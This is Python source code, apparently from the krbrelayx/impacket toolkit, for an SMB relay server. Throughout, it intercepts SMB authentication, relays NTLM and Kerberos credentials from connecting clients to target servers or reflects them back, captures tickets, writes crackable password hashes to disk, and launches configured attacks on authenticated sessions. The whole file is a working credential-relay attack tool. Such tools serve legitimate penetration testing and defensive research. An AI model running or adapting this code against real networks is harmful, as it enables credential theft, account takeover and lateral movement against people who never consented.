# Copyright (c) 2013-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# SMB Relay Server
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#
# Description:
#             This is the SMB server which relays the connections
#   to other protocols
from __future__ import division
from __future__ import print_function
from six import b
from threading import Thread
try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser
import struct
import logging
import time
import calendar
import random
import string
import socket

from binascii import hexlify
from impacket import smb, ntlm, LOG, smb3
from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.spnego import SPNEGO_NegTokenResp, SPNEGO_NegTokenInit
from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToFile
from impacket.spnego import ASN1_AID, ASN1_SUPPORTED_MECH
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.smbserver import getFileTime
from pyasn1.codec.der import decoder, encoder
from impacket.examples.krbrelayx.utils.kerberos import get_kerberos_loot, get_auth_data
from impacket.examples.krbrelayx.utils.spnego import GSSAPIHeader_SPNEGO_Init2, GSSAPIHeader_SPNEGO_Init, MechTypes, MechType, TypesMech, NegTokenResp, NegResult, NegotiationToken

class SMBRelayServer(Thread):
    def __init__(self,config):
        Thread.__init__(self)
        self.daemon = True
        self.server = 0
        #Config object
        self.config = config
        #Current target IP
        self.target = None
        #Targets handler
        self.targetprocessor = self.config.target
        #Username we auth as gets stored here later
        self.authUser = None
        self.proxyTranslator = None

        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file','None')
        smbConfig.set('global','credentials_file','')

        if self.config.smb2support is True:
            smbConfig.set("global", "SMB2Support", "True")
        else:
            smbConfig.set("global", "SMB2Support", "False")

        if self.config.outputFile is not None:
            smbConfig.set('global','jtr_dump_path',self.config.outputFile)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path','')

        # Change address_family to IPv6 if this is configured
        if self.config.ipv6:
            SMBSERVER.address_family = socket.AF_INET6

        # changed to dereference configuration interfaceIp
        self.server = SMBSERVER((config.interfaceIp,445), config_parser = smbConfig)
        logging.getLogger('impacket.smbserver').setLevel(logging.CRITICAL)

        self.server.processConfigFile()

        self.origSmbComNegotiate = self.server.hookSmbCommand(smb.SMB.SMB_COM_NEGOTIATE, self.SmbComNegotiate)
        self.origSmbSessionSetupAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX, self.SmbSessionSetupAndX)

        self.origSmbNegotiate = self.server.hookSmb2Command(smb3.SMB2_NEGOTIATE, self.SmbNegotiate)
        self.origSmbSessionSetup = self.server.hookSmb2Command(smb3.SMB2_SESSION_SETUP, self.SmbSessionSetup)
        # Let's use the SMBServer Connection dictionary to keep track of our client connections as well
        #TODO: See if this is the best way to accomplish this

        # changed to dereference configuration interfaceIp
        self.server.addConnection('SMBRelay', config.interfaceIp, 445)

    ### SMBv2 Part #################################################################
    def SmbNegotiate(self, connId, smbServer, recvPacket, isSMB1=False):
        connData = smbServer.getConnectionData(connId, checkStatus=False)


        LOG.info("SMBD: Received connection from %s" % (connData['ClientIP']))

        respPacket = smb3.SMB2Packet()
        respPacket['Flags'] = smb3.SMB2_FLAGS_SERVER_TO_REDIR
        respPacket['Status'] = STATUS_SUCCESS
        respPacket['CreditRequestResponse'] = 1
        respPacket['Command'] = smb3.SMB2_NEGOTIATE
        respPacket['SessionID'] = 0

        if isSMB1 is False:
            respPacket['MessageID'] = recvPacket['MessageID']
        else:
            respPacket['MessageID'] = 0

        respPacket['TreeID'] = 0

        respSMBCommand = smb3.SMB2Negotiate_Response()

        # Just for the Nego Packet, then disable it
        respSMBCommand['SecurityMode'] = smb3.SMB2_NEGOTIATE_SIGNING_ENABLED

        if isSMB1 is True:
            # Let's first parse the packet to see if the client supports SMB2
            SMBCommand = smb.SMBCommand(recvPacket['Data'][0])

            dialects = SMBCommand['Data'].split(b'\x02')
            if b'SMB 2.002\x00' in dialects or b'SMB 2.???\x00' in dialects:
                respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_002
                #respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_21
            else:
                # Client does not support SMB2 fallbacking
                raise Exception('Client does not support SMB2, fallbacking')
        else:
            respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_002
            #respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_21

        respSMBCommand['ServerGuid'] = b(''.join([random.choice(string.ascii_letters) for _ in range(16)]))
        respSMBCommand['Capabilities'] = 0
        respSMBCommand['MaxTransactSize'] = 65536
        respSMBCommand['MaxReadSize'] = 65536
        respSMBCommand['MaxWriteSize'] = 65536
        respSMBCommand['SystemTime'] = getFileTime(calendar.timegm(time.gmtime()))
        respSMBCommand['ServerStartTime'] = getFileTime(calendar.timegm(time.gmtime()))
        respSMBCommand['SecurityBufferOffset'] = 0x80

        blob = GSSAPIHeader_SPNEGO_Init2()
        blob['tokenOid'] = '1.3.6.1.5.5.2'
        blob['innerContextToken']['mechTypes'].extend([MechType(TypesMech['KRB5 - Kerberos 5']),
                                                       MechType(TypesMech['MS KRB5 - Microsoft Kerberos 5']),
                                                       MechType(TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'])])
        blob['innerContextToken']['negHints']['hintName'] = "not_defined_in_RFC4178@please_ignore"
        respSMBCommand['Buffer'] = encoder.encode(blob)

        respSMBCommand['SecurityBufferLength'] = len(respSMBCommand['Buffer'])

        respPacket['Data'] = respSMBCommand

        smbServer.setConnectionData(connId, connData)

        return None, [respPacket], STATUS_SUCCESS

    # This is SMB2
    def SmbSessionSetup(self, connId, smbServer, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus = False)
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        #############################################################

        respSMBCommand = smb3.SMB2SessionSetup_Response()
        sessionSetupData = smb3.SMB2SessionSetup(recvPacket['Data'])

        connData['Capabilities'] = sessionSetupData['Capabilities']

        securityBlob = sessionSetupData['Buffer']

        rawNTLM = False
        if struct.unpack('B',securityBlob[0:1])[0] == ASN1_AID:

            # negTokenInit packet
            try:
                blob = decoder.decode(securityBlob, asn1Spec=GSSAPIHeader_SPNEGO_Init())[0]
                token = blob['innerContextToken']['negTokenInit']['mechToken']

                if len(blob['innerContextToken']['negTokenInit']['mechTypes']) > 0:
                    # Is this GSSAPI NTLM or something else we don't support?
                    mechType = blob['innerContextToken']['negTokenInit']['mechTypes'][0]
                    if str(mechType) != TypesMech['KRB5 - Kerberos 5'] and str(mechType) != \
                                     TypesMech['MS KRB5 - Microsoft Kerberos 5']:
                        # Nope, do we know it?
                        if str(mechType) in MechTypes:
                            mechStr = MechTypes[str(mechType)]
                        else:
                            mechStr = mechType
                        smbServer.log("Unsupported MechType '%s'" % mechStr, logging.CRITICAL)
                        # We don't know the token, we answer back again saying
                        # we just support Kerberos.
                        respToken = NegotiationToken()
                        respToken['negTokenResp']['negResult'] = 'request_mic'
                        respToken['negTokenResp']['supportedMech'] = TypesMech['KRB5 - Kerberos 5']
                        respTokenData = encoder.encode(respToken)
                        respSMBCommand['SecurityBufferOffset'] = 0x48
                        respSMBCommand['SecurityBufferLength'] = len(respTokenData)
                        respSMBCommand['Buffer'] = respTokenData

                        return [respSMBCommand], None, STATUS_MORE_PROCESSING_REQUIRED
                    else:

                        # This is Kerberos, we can do something with this
                        try:
                            if self.config.mode == 'EXPORT':
                                authdata = get_kerberos_loot(securityBlob, self.config)
                            
                            # Are we in attack mode? If so, launch attack against all targets
                            if self.config.mode == 'ATTACK':
                                # If you're looking for the magic, it's in lib/utils/kerberos.py
                                authdata = get_kerberos_loot(securityBlob, self.config)
                                self.do_attack(authdata)

                            if self.config.mode == 'RELAY':
                                authdata = get_auth_data(securityBlob, self.config)
                                self.do_relay(authdata)

                            # This ignores all signing stuff
                            # causes connection resets
                            # Todo: reply properly!

                            respToken = NegotiationToken()
                            # accept-completed
                            respToken['negTokenResp']['negResult'] = 'accept_completed'

                            respSMBCommand['SecurityBufferOffset'] = 0x48
                            respSMBCommand['SecurityBufferLength'] = len(respToken)
                            respSMBCommand['Buffer'] = encoder.encode(respToken)

                            smbServer.setConnectionData(connId, connData)

                            return [respSMBCommand], None, STATUS_SUCCESS

                        # Somehow the function above catches all exceptions and hides them
                        # which is pretty annoying
                        except Exception as e:
                            import traceback
                            traceback.print_exc()
                            raise

                        pass
            except:
                import traceback
                traceback.print_exc()
        else:
            # No GSSAPI stuff, we can't do anything with this
            smbServer.log("No negTokenInit sent by client", logging.CRITICAL)
            raise Exception('No negTokenInit sent by client')

        respSMBCommand['SecurityBufferOffset'] = 0x48
        respSMBCommand['SecurityBufferLength'] = len(respToken)
        respSMBCommand['Buffer'] = respToken.getData()

        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode
    ################################################################################

    ### SMBv1 Part #################################################################
    def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus = False)
        if self.config.mode.upper() == 'REFLECTION':
            self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])

        #TODO: Check if a cache is better because there is no way to know which target was selected for this victim
        # except for relying on the targetprocessor selecting the same target unless a relay was already done
        self.target = self.targetprocessor.getTarget()

        #############################################################
        # SMBRelay
        # Get the data for all connections
        smbData = smbServer.getConnectionData('SMBRelay', False)

        if smbData.has_key(self.target):
            # Remove the previous connection and use the last one
            smbClient = smbData[self.target]['SMBClient']
            del smbClient
            del smbData[self.target]

        LOG.info("SMBD: Received connection from %s, attacking target %s://%s" % (connData['ClientIP'], self.target.scheme, self.target.netloc))

        try:
            if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
                extSec = False
            else:
                if self.config.mode.upper() == 'REFLECTION':
                    # Force standard security when doing reflection
                    LOG.debug("Downgrading to standard security")
                    extSec = False
                    recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
                else:
                    extSec = True

            #Init the correct client for our target
            client = self.init_client(extSec)
        except Exception as e:
            LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
            self.targetprocessor.logTarget(self.target)
        else:
            smbData[self.target] = {}
            smbData[self.target]['SMBClient'] = client
            connData['EncryptionKey'] = client.getStandardSecurityChallenge()
            smbServer.setConnectionData('SMBRelay', smbData)
            smbServer.setConnectionData(connId, connData)

        return self.origSmbComNegotiate(connId, smbServer, SMBCommand, recvPacket)
        #############################################################

    def SmbSessionSetupAndX(self, connId, smbServer, SMBCommand, recvPacket):

        connData = smbServer.getConnectionData(connId, checkStatus = False)
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        #############################################################

        respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)

        if connData['_dialects_parameters']['Capabilities'] & smb.SMB.CAP_EXTENDED_SECURITY:
            # Extended security. Here we deal with all SPNEGO stuff
            respParameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
            respData       = smb.SMBSessionSetupAndX_Extended_Response_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Extended_Parameters(SMBCommand['Parameters'])
            sessionSetupData = smb.SMBSessionSetupAndX_Extended_Data()
            sessionSetupData['SecurityBlobLength'] = sessionSetupParameters['SecurityBlobLength']
            sessionSetupData.fromString(SMBCommand['Data'])
            connData['Capabilities'] = sessionSetupParameters['Capabilities']

            if struct.unpack('B',sessionSetupData['SecurityBlob'][0])[0] != ASN1_AID:
               # If there no GSSAPI ID, it must be an AUTH packet
               blob = SPNEGO_NegTokenResp(sessionSetupData['SecurityBlob'])
               token = blob['ResponseToken']
            else:
               # NEGOTIATE packet
               blob =  SPNEGO_NegTokenInit(sessionSetupData['SecurityBlob'])
               token = blob['MechToken']

            # Here we only handle NTLMSSP, depending on what stage of the
            # authentication we are, we act on it
            messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

            if messageType == 0x01:
                # NEGOTIATE_MESSAGE
                negotiateMessage = ntlm.NTLMAuthNegotiate()
                negotiateMessage.fromString(token)
                # Let's store it in the connection data
                connData['NEGOTIATE_MESSAGE'] = negotiateMessage

                #############################################################
                # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client.
                # Let's send it to the target server and send the answer back to the client.
                client = smbData[self.target]['SMBClient']
                try:
                    challengeMessage = self.do_ntlm_negotiate(client,token)
                except Exception as e:
                    # Log this target as processed for this client
                    self.targetprocessor.logTarget(self.target)
                    # Raise exception again to pass it on to the SMB server
                    raise

                #############################################################

                respToken = SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegResult'] = b'\x01'
                respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
                respToken['ResponseToken'] = str(challengeMessage)

                # Setting the packet to STATUS_MORE_PROCESSING
                errorCode = STATUS_MORE_PROCESSING_REQUIRED

                # Let's set up an UID for this connection and store it
                # in the connection's data
                # Picking a fixed value
                # TODO: Manage more UIDs for the same session
                connData['Uid'] = 10

                connData['CHALLENGE_MESSAGE'] = challengeMessage

            elif messageType == 0x03:
                # AUTHENTICATE_MESSAGE, here we deal with authentication
                #############################################################
                # SMBRelay: Ok, so now the have the Auth token, let's send it
                # back to the target system and hope for the best.
                client = smbData[self.target]['SMBClient']
                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)

                if authenticateMessage['user_name'] != '':
                    #For some attacks it is important to know the authenticated username, so we store it
                    self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                                authenticateMessage['user_name'].decode('utf-16le'))).upper()

                    clientResponse, errorCode = self.do_ntlm_auth(client,sessionSetupData['SecurityBlob'],
                                                                  connData['CHALLENGE_MESSAGE']['challenge'])
                else:
                    # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                    errorCode = STATUS_ACCESS_DENIED

                if errorCode != STATUS_SUCCESS:
                    # Let's return what the target returned, hope the client connects back again
                    packet = smb.NewSMBPacket()
                    packet['Flags1']  = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
                    packet['Flags2']  = smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_EXTENDED_SECURITY
                    packet['Command'] = recvPacket['Command']
                    packet['Pid']     = recvPacket['Pid']
                    packet['Tid']     = recvPacket['Tid']
                    packet['Mid']     = recvPacket['Mid']
                    packet['Uid']     = recvPacket['Uid']
                    packet['Data']    = b'\x00\x00\x00'
                    packet['ErrorCode']   = errorCode >> 16
                    packet['ErrorClass']  = errorCode & 0xff

                    LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
                    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'],
                    authenticateMessage['user_name']))

                    #Log this target as processed for this client
                    self.targetprocessor.logTarget(self.target)

                    client.killConnection()

                    return None, [packet], errorCode
                else:
                    # We have a session, create a thread and do whatever we want
                    LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
                    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'], authenticateMessage['user_name']))

                    # Log this target as processed for this client
                    self.targetprocessor.logTarget(self.target, True)

                    ntlm_hash_data = outputToJohnFormat(connData['CHALLENGE_MESSAGE']['challenge'],
                                                        authenticateMessage['user_name'],
                                                        authenticateMessage['domain_name'],
                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                    client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                    if self.server.getJTRdumpPath() != '':
                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                              self.server.getJTRdumpPath())

                    del (smbData[self.target])

                    self.do_attack(client)
                    # Now continue with the server
                #############################################################

                respToken = SPNEGO_NegTokenResp()
                # accept-completed
                respToken['NegResult'] = b'\x00'

                # Status SUCCESS
                errorCode = STATUS_SUCCESS
                # Let's store it in the connection data
                connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
            else:
                raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

            respParameters['SecurityBlobLength'] = len(respToken)

            respData['SecurityBlobLength'] = respParameters['SecurityBlobLength']
            respData['SecurityBlob']       = respToken.getData()

        else:
            # Process Standard Security
            #TODO: Fix this for other protocols than SMB [!]
            respParameters = smb.SMBSessionSetupAndXResponse_Parameters()
            respData       = smb.SMBSessionSetupAndXResponse_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Parameters(SMBCommand['Parameters'])
            sessionSetupData = smb.SMBSessionSetupAndX_Data()
            sessionSetupData['AnsiPwdLength'] = sessionSetupParameters['AnsiPwdLength']
            sessionSetupData['UnicodePwdLength'] = sessionSetupParameters['UnicodePwdLength']
            sessionSetupData.fromString(SMBCommand['Data'])

            client = smbData[self.target]['SMBClient']
            _, errorCode = client.sendStandardSecurityAuth(sessionSetupData)

            if errorCode != STATUS_SUCCESS:
                # Let's return what the target returned, hope the client connects back again
                packet = smb.NewSMBPacket()
                packet['Flags1']  = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
                packet['Flags2']  = smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_EXTENDED_SECURITY
                packet['Command'] = recvPacket['Command']
                packet['Pid']     = recvPacket['Pid']
                packet['Tid']     = recvPacket['Tid']
                packet['Mid']     = recvPacket['Mid']
                packet['Uid']     = recvPacket['Uid']
                packet['Data']    = '\x00\x00\x00'
                packet['ErrorCode']   = errorCode >> 16
                packet['ErrorClass']  = errorCode & 0xff

                #Log this target as processed for this client
                self.targetprocessor.logTarget(self.target)

                # Finish client's connection
                #client.killConnection()

                return None, [packet], errorCode
            else:
                # We have a session, create a thread and do whatever we want
                LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
                    self.target.scheme, self.target.netloc, sessionSetupData['PrimaryDomain'],
                    sessionSetupData['Account']))

                self.authUser = ('%s/%s' % (sessionSetupData['PrimaryDomain'], sessionSetupData['Account'])).upper()

                # Log this target as processed for this client
                self.targetprocessor.logTarget(self.target, True)

                ntlm_hash_data = outputToJohnFormat('', sessionSetupData['Account'], sessionSetupData['PrimaryDomain'],
                                                    sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'])
                client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                if self.server.getJTRdumpPath() != '':
                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                          self.server.getJTRdumpPath())

                del (smbData[self.target])

                self.do_attack(client)
                # Now continue with the server
            #############################################################

        respData['NativeOS']     = smbServer.getServerOS()
        respData['NativeLanMan'] = smbServer.getServerOS()
        respSMBCommand['Parameters'] = respParameters
        respSMBCommand['Data']       = respData

        # From now on, the client can ask for other commands
        connData['Authenticated'] = True

        #############################################################
        # SMBRelay
        smbServer.setConnectionData('SMBRelay', smbData)
        #############################################################
        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode
    ################################################################################

    def do_attack(self, authdata):
        # Do attack. Note that unlike the HTTP server, the config entries are stored in the current object and not in any of its properties
        self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
        # No SOCKS, since socks is pointless when you can just export the tickets
        # instead we iterate over all the targets
        for target in self.config.target.originalTargets:
            parsed_target = target
            if parsed_target.scheme.upper() in self.config.attacks:
                client = self.config.protocolClients[target.scheme.upper()](self.config, parsed_target)
                client.initConnection(authdata, self.config.dcip)
                # We have an attack.. go for it
                attack = self.config.attacks[parsed_target.scheme.upper()]
                client_thread = attack(self.config, client.session, self.authUser)
                client_thread.start()
            else:
                LOG.error('No attack configured for %s', parsed_target.scheme.upper())

    def do_relay(self, authdata):
        self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
        sclass, host = authdata['service'].split('/')
        for target in self.config.target.originalTargets:
            parsed_target = target
            if host.lower() in parsed_target.hostname.lower():
                # Found a target with the same SPN
                client = self.config.protocolClients[target.scheme.upper()](self.config, parsed_target)
                if not client.initConnection(authdata, self.config.dcip):
                    return
                # We have an attack.. go for it
                attack = self.config.attacks[parsed_target.scheme.upper()]
                client_thread = attack(self.config, client.session, self.authUser)
                client_thread.start()
                return
        # Still here? Then no target was found matching this SPN
        LOG.error('No target configured that matches the hostname of the SPN in the ticket: %s', parsed_target.netloc.lower())

    def _start(self):
        self.server.daemon_threads=True
        self.server.serve_forever()
        LOG.info('Shutting down SMB Server')
        self.server.server_close()

    def run(self):
        LOG.info("Setting up SMB Server")
        self._start()
